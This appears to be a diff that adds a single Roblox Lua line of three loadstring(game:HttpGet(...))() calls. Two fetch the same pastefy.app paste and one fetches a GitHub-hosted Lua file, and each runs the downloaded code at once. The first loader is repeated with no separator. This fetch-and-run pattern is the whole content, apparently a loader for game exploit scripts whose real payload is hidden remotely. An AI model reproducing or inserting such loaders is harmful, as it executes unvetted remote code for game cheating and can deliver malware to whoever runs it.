@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://pastefy.app/frkRBAYC/raw"))()loadstring(game:HttpGet("https://pastefy.app/frkRBAYC/raw"))()loadstring(game:HttpGet("https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Chris.lua"))()
